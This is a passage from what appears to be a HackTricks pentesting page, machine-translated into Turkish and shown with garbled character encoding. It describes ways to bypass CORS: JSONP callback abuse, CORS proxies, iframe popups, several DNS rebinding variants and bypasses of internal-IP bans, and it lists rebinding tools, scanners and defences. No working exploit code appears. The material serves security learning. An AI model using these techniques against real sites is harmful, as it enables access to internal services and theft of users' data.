Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, dinamik JavaScript veya JSONP (Padding ile JSON) sÃ¶z konusu olduÄŸunda Ã¶zellikle Ã¶nemlidir, Ã¶zellikle kimlik doÄŸrulama iÃ§in Ã§erezler gibi ortam yetkisi bilgileri kullanÄ±ldÄ±ÄŸÄ±nda. FarklÄ± bir ana bilgisayardan bir kaynak talep edildiÄŸinde, Ã§erezler dahil edilir ve bu da saldÄ±rganÄ±n eriÅŸimine aÃ§Ä±lÄ±r.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± daha iyi anlamak ve hafifletmek iÃ§in [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp) adresinde bulunan BurpSuite eklentisini kullanabilirsiniz. Bu eklenti, web uygulamalarÄ±nÄ±zdaki potansiyel XSSI gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tanÄ±mlamaya ve ele almaya yardÄ±mcÄ± olabilir.

[**XSSI'nin farklÄ± tÃ¼rleri ve bunlarÄ± nasÄ±l istismar edeceÄŸiniz hakkÄ±nda daha fazla bilgi edinin.**](xssi-cross-site-script-inclusion.md)

Talepte bir **`callback`** **parametresi** eklemeyi deneyin. Belki de sayfa verileri JSONP olarak gÃ¶ndermeye hazÄ±rlanmÄ±ÅŸtÄ±r. Bu durumda, sayfa `Content-Type: application/javascript` ile verileri geri gÃ¶nderecek ve CORS politikasÄ±nÄ± atlatacaktÄ±r.

![](<../.gitbook/assets/image (856).png>)

### Kolay (gereksiz?) atlatma

`Access-Control-Allow-Origin` kÄ±sÄ±tlamasÄ±nÄ± atlatmanÄ±n bir yolu, bir web uygulamasÄ±ndan sizin adÄ±nÄ±za bir istek yapmasÄ±nÄ± istemek ve yanÄ±tÄ± geri gÃ¶ndermesidir. Ancak, bu senaryoda, nihai kurbanÄ±n kimlik bilgileri farklÄ± bir alan adÄ±na yapÄ±lan istekle gÃ¶nderilmeyecektir.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Bu araÃ§, isteÄŸinizi baÅŸlÄ±klarÄ±yla birlikte ileten bir proxy saÄŸlar ve ayrÄ±ca Origin baÅŸlÄ±ÄŸÄ±nÄ± istenen alan adÄ±yla eÅŸleÅŸecek ÅŸekilde sahte bir ÅŸekilde ayarlar. Bu, CORS politikasÄ±nÄ± etkili bir ÅŸekilde atlatÄ±r. Ä°ÅŸte XMLHttpRequest ile bir Ã¶rnek kullanÄ±m:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Bu araÃ§, istekleri proxylemek iÃ§in alternatif bir yaklaÅŸÄ±m sunar. Ä°steÄŸinizi olduÄŸu gibi iletmek yerine, sunucu belirtilen parametrelerle kendi isteÄŸini yapar.

### Iframe + Popup Atlatma

`e.origin === window.origin` gibi **CORS kontrollerini atlatmak** iÃ§in **bir iframe oluÅŸturabilir** ve **ondan yeni bir pencere aÃ§abilirsiniz**. Daha fazla bilgi iÃ§in aÅŸaÄŸÄ±daki sayfaya bakÄ±n:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### TTL Ãœzerinden DNS Rebinding

TTL Ã¼zerinden DNS rebinding, DNS kayÄ±tlarÄ±nÄ± manipÃ¼le ederek belirli gÃ¼venlik Ã¶nlemlerini atlatmak iÃ§in kullanÄ±lan bir tekniktir. Ä°ÅŸte nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±:

1. SaldÄ±rgan bir web sayfasÄ± oluÅŸturur ve kurbanÄ±n buna eriÅŸmesini saÄŸlar.
2. SaldÄ±rgan daha sonra kendi alan adÄ±nÄ±n DNS (IP) adresini kurbanÄ±n web sayfasÄ±na yÃ¶nlendirecek ÅŸekilde deÄŸiÅŸtirir.
3. KurbanÄ±n tarayÄ±cÄ±sÄ± DNS yanÄ±tÄ±nÄ± Ã¶nbelleÄŸe alÄ±r; bu yanÄ±tÄ±n geÃ§erlilik sÃ¼resini belirten bir TTL (Time to Live) deÄŸeri olabilir.
4. TTL sÃ¼resi dolduÄŸunda, kurbanÄ±n tarayÄ±cÄ±sÄ± yeni bir DNS isteÄŸi yapar ve bu, saldÄ±rgana kurbanÄ±n sayfasÄ±nda JavaScript kodu Ã§alÄ±ÅŸtÄ±rma imkanÄ± tanÄ±r.
5. KurbanÄ±n IP'si Ã¼zerinde kontrolÃ¼ sÃ¼rdÃ¼rerek, saldÄ±rgan kurban sunucusuna herhangi bir Ã§erez gÃ¶ndermeden bilgi toplayabilir.

TarayÄ±cÄ±larÄ±n, bu tekniÄŸin hemen kÃ¶tÃ¼ye kullanÄ±lmasÄ±nÄ± Ã¶nleyebilecek Ã¶nbellekleme mekanizmalarÄ±na sahip olduÄŸunu belirtmek Ã¶nemlidir; bu, dÃ¼ÅŸÃ¼k TTL deÄŸerleriyle bile geÃ§erlidir.

DNS rebinding, kurban tarafÄ±ndan gerÃ§ekleÅŸtirilen aÃ§Ä±k IP kontrollerini atlatmak veya bir kullanÄ±cÄ±nÄ±n veya botun uzun bir sÃ¼re boyunca aynÄ± sayfada kalmasÄ± durumlarÄ±nda yararlÄ± olabilir; bu, Ã¶nbelleÄŸin sÃ¼resinin dolmasÄ±na olanak tanÄ±r.

DNS rebinding'i kÃ¶tÃ¼ye kullanmak iÃ§in hÄ±zlÄ± bir yol arÄ±yorsanÄ±z, [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) gibi hizmetleri kullanabilirsiniz.

Kendi DNS rebinding sunucunuzu Ã§alÄ±ÅŸtÄ±rmak iÃ§in **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)) gibi araÃ§larÄ± kullanabilirsiniz. Bu, yerel 53/udp portunuzu aÃ§mayÄ±, ona iÅŸaret eden bir A kaydÄ± oluÅŸturmayÄ± (Ã¶rneÄŸin, ns.example.com) ve daha Ã¶nce oluÅŸturulan A alt alan adÄ±na iÅŸaret eden bir NS kaydÄ± oluÅŸturmayÄ± iÃ§erir (Ã¶rneÄŸin, ns.example.com). ns.example.com alt alan adÄ±nÄ±n herhangi bir alt alan adÄ±, ardÄ±ndan sizin ana bilgisayarÄ±nÄ±z tarafÄ±ndan Ã§Ã¶zÃ¼lecektir.

AyrÄ±ca, daha fazla anlayÄ±ÅŸ ve deneyim iÃ§in [http://rebind.it/singularity.html](http://rebind.it/singularity.html) adresinde kamuya aÃ§Ä±k bir sunucu keÅŸfedebilirsiniz.

### DNS Rebinding **DNS Cache Flooding** Ãœzerinden

DNS cache flooding Ã¼zerinden DNS rebinding, tarayÄ±cÄ±larÄ±n Ã¶nbellekleme mekanizmasÄ±nÄ± atlatmak ve ikinci bir DNS isteÄŸi zorlamak iÃ§in kullanÄ±lan baÅŸka bir tekniktir. Ä°ÅŸte nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±:

1. Ä°lk olarak, kurban bir DNS isteÄŸi yaptÄ±ÄŸÄ±nda, saldÄ±rganÄ±n IP adresiyle yanÄ±tlanÄ±r.
2. Ã–nbellek savunmasÄ±nÄ± atlatmak iÃ§in saldÄ±rgan bir hizmet Ã§alÄ±ÅŸanÄ± kullanÄ±r. Hizmet Ã§alÄ±ÅŸanÄ± DNS Ã¶nbelleÄŸini doldurur, bu da Ã¶nbellekteki saldÄ±rgan sunucu adÄ±nÄ± etkili bir ÅŸekilde siler.
3. KurbanÄ±n tarayÄ±cÄ±sÄ± ikinci bir DNS isteÄŸi yaptÄ±ÄŸÄ±nda, artÄ±k 127.0.0.1 IP adresiyle yanÄ±tlanÄ±r; bu genellikle localhost'u ifade eder.

Hizmet Ã§alÄ±ÅŸanÄ±yla DNS Ã¶nbelleÄŸini doldurarak, saldÄ±rgan DNS Ã§Ã¶zÃ¼mleme sÃ¼recini manipÃ¼le edebilir ve kurbanÄ±n tarayÄ±cÄ±sÄ±nÄ± ikinci bir istekte bulunmaya zorlayabilir; bu sefer saldÄ±rganÄ±n istediÄŸi IP adresine Ã§Ã¶zÃ¼lÃ¼r.

### DNS Rebinding **Cache** Ãœzerinden

Ã–nbellek savunmasÄ±nÄ± atlatmanÄ±n bir baÅŸka yolu, DNS saÄŸlayÄ±cÄ±sÄ±nda aynÄ± alt alan iÃ§in birden fazla IP adresi kullanmaktÄ±r. Ä°ÅŸte nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±:

1. SaldÄ±rgan, DNS saÄŸlayÄ±cÄ±sÄ±nda aynÄ± alt alan iÃ§in iki A kaydÄ± (veya iki IP ile tek bir A kaydÄ±) oluÅŸturur.
2. Bir tarayÄ±cÄ± bu kayÄ±tlarÄ± kontrol ettiÄŸinde, her iki IP adresini de alÄ±r.
3. TarayÄ±cÄ± saldÄ±rganÄ±n IP adresini Ã¶nce kullanmaya karar verirse, saldÄ±rgan aynÄ± alan adÄ±na HTTP istekleri gerÃ§ekleÅŸtiren bir yÃ¼k sunabilir.
4. Ancak, saldÄ±rgan kurbanÄ±n IP adresini aldÄ±ktan sonra, kurbanÄ±n tarayÄ±cÄ±sÄ±na yanÄ±t vermeyi durdurur.
5. KurbanÄ±n tarayÄ±cÄ±sÄ±, alan adÄ±nÄ±n yanÄ±t vermediÄŸini fark ettiÄŸinde, verilen ikinci IP adresini kullanmaya geÃ§er.
6. Ä°kinci IP adresine eriÅŸerek, tarayÄ±cÄ± Same Origin Policy (SOP) kuralÄ±nÄ± atlatÄ±r ve saldÄ±rganÄ±n bunu kÃ¶tÃ¼ye kullanmasÄ±na ve bilgi toplamasÄ±na olanak tanÄ±r.

Bu teknik, bir alan iÃ§in birden fazla IP adresi saÄŸlandÄ±ÄŸÄ±nda tarayÄ±cÄ±larÄ±n davranÄ±ÅŸÄ±nÄ± kullanÄ±r. YanÄ±tlarÄ± stratejik olarak kontrol ederek ve tarayÄ±cÄ±nÄ±n IP adresi seÃ§imini manipÃ¼le ederek, bir saldÄ±rgan SOP'yi istismar edebilir ve kurbandan bilgi alabilir.

{% hint style="warning" %}
localhost'a eriÅŸmek iÃ§in Windows'ta **127.0.0.1** ve Linux'ta **0.0.0.0** yeniden baÄŸlamayÄ± denemelisiniz.\
Godaddy veya Cloudflare gibi saÄŸlayÄ±cÄ±lar 0.0.0.0 IP'sini kullanmama izin vermedi, ancak AWS route53, "0.0.0.0" olan 2 IP ile bir A kaydÄ± oluÅŸturmama izin verdi.

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

Daha fazla bilgi iÃ§in [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/) adresini kontrol edebilirsiniz.

### DiÄŸer YaygÄ±n Atlatmalar

* EÄŸer **iÃ§ IP'ler yasaklanmÄ±ÅŸsa**, **0.0.0.0'Ä± yasaklamayÄ± unutmuÅŸ olabilirler** (Linux ve Mac'te Ã§alÄ±ÅŸÄ±r)
* EÄŸer **iÃ§ IP'ler yasaklanmÄ±ÅŸsa**, **localhost** iÃ§in bir **CNAME** ile yanÄ±t verin (Linux ve Mac'te Ã§alÄ±ÅŸÄ±r)
* EÄŸer **iÃ§ IP'ler** DNS yanÄ±tlarÄ± olarak yasaklanmÄ±ÅŸsa, **www.corporate.internal** gibi **iÃ§ hizmetlere CNAME'lerle yanÄ±t verebilirsiniz**.

### DNS Rebidding SilahlandÄ±rÄ±ldÄ±

Ã–nceki atlatma teknikleri ve aÅŸaÄŸÄ±daki aracÄ± nasÄ±l kullanacaÄŸÄ±nÄ±z hakkÄ±nda daha fazla bilgi iÃ§in [Gerald Doussot - DNS Rebinding SaldÄ±rÄ±larÄ± Durumu & Origin'in TekilliÄŸi - DEF CON 27 KonferansÄ±](https://www.youtube.com/watch?v=y9-0lICNjOQ) konuÅŸmasÄ±na bakabilirsiniz.

[**`Origin'in TekilliÄŸi`**](https://github.com/nccgroup/singularity), [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding) saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in bir araÃ§tÄ±r. SaldÄ±rÄ± sunucusunun DNS adÄ±nÄ±n IP adresini hedef makinenin IP adresine yeniden baÄŸlamak ve hedef makinedeki savunmasÄ±z yazÄ±lÄ±mlarÄ± istismar etmek iÃ§in gerekli bileÅŸenleri iÃ§erir.

### DNS Rebinding'e KarÅŸÄ± GerÃ§ek Koruma

* Ä°Ã§ hizmetlerde TLS kullanÄ±n
* Verilere eriÅŸim iÃ§in kimlik doÄŸrulama isteyin
* Host baÅŸlÄ±ÄŸÄ±nÄ± doÄŸrulayÄ±n
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Kamu sunucularÄ±nÄ±n iÃ§ sunuculara eriÅŸmek istediÄŸinde her zaman bir Ã¶n uÃ§ isteÄŸi gÃ¶ndermeyi Ã¶neren Ã¶neri

## **AraÃ§lar**

**CORS politikalarÄ±ndaki olasÄ± yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± test edin**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## Referanslar

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **HackTricks** ve **HackTricks Cloud** github reposuna PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}
